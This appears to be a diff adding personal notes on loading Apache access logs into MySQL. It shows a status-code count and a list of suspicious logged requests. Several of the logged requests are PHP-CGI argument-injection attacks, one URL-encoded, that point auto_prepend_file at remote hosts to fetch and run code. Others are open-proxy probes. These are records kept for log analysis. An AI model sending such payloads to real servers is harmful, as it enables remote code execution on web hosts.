@@ -1,0 +1,35 @@
+
+http://www.rostyslav.net/load-apache-logs-into-mysql/
+http://stackoverflow.com/questions/16285864/how-can-i-correct-mysql-load-error
+
+
+mysql> select result,count(*) from test.access group by result order by result;
++--------+----------+
+| result | count(*) |
++--------+----------+
+|    200 |    14458 |
+|    206 |       25 |
+|    302 |        3 |
+|    304 |     3003 |
+|    400 |      223 |
+|    404 |     4466 |
+|    408 |        8 |
+|    500 |        7 |
+|    501 |       24 |
+|    503 |        3 |
++--------+----------+
+10 rows in set (0.04 sec)
+
+
+'1', 'GET http://24x7-allrequestsallowed.com/?PHPSESSID=7ja4t5ba00143TVMVRU_EGDFUDT HTTP/1.1'
+'1', 'GET http://24x7-allrequestsallowed.com/?PHPSESSID=1rmsjtj500143TVMVRU_EGDFUDT HTTP/1.1'
+'1', 'POST /?%2D%64+%61%6C%6C%6F%77%5F%75%72%6C%5F%69%6E%63%6C%75%64%65%3D%6F%6E+%2D%64+%73%61%66%65%5F%6D%6F%64%65%3D%6F%66%66+%2D%64+%73%75%68%6F%73%69%6E%2E%73%69%6D%75%6C%61%74%69%6F%6E%3D%6F%6E+%2D%64+%64%69%73%61%62%6C%65%5F%66%75%6E%63%74%69%6F%6E%73%3D%'
+'1', 'GET /?-dsafe_mode%3dOff+-ddisable_functions%3dNULL+-dallow_url_fopen%3dOn+-dallow_url_include%3dOn+-dauto_prepend_file%3dhttp%3A%2F%2F61.19.253.26%2Fecho.txt HTTP/1.1'
+'1', 'GET /?q=user/register HTTP/1.1'
+'2', 'GET http://proxyjudge.info HTTP/1.1'
+'8', 'GET /?-dsafe_mode%3dOff+-ddisable_functions%3dNULL+-dallow_url_fopen%3dOn+-dallow_url_include%3dOn+-dauto_prepend_file%3dhttp%3A%2F%2F75.99.7.131%2Fchanglog.txt HTTP/1.1'
+
+
+
+-d allow_url_include=on -d safe_mode=off -d suhosin.simulation=on -d disable_functions=%
+http://75.99.7.131/
